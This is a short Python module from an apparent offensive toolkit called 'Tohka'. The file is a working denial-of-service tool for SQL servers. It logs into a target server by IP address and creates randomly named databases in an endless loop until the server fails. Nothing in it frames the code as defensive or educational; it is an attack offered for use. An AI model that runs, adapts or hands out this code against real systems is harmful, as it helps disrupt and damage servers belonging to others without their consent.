from random import choices

from Tohka.lib.constants import ALPHA     #type: ignore
from Tohka.lib.colors    import Colors    #type: ignore
from Tohka.lib.login     import login_sql #type: ignore

class TohkaModule:
    def main(params: str) -> None: 
        """Flood SQL server (creating databases).

        Args:
            params(str): SQL server IP address

        Returns:
            None
        """
        if (conn := login_sql(params)):
            print(f'\n{Colors.YELLOW}• {Colors.WHITE}Attempting to flood SQL server...')
            cursor = conn.cursor()
            while True:
                # NOTE: Database name we are creating
                new_db: str = ''.join(choices(ALPHA, k=5))
                try:
                    cursor.execute(f"CREATE DATABASE {new_db}")
                    print(f"  {Colors.LIME}• {Colors.WHITE}Created Database: {Colors.VIOLET}{new_db}")
                except:
                    break
            print()
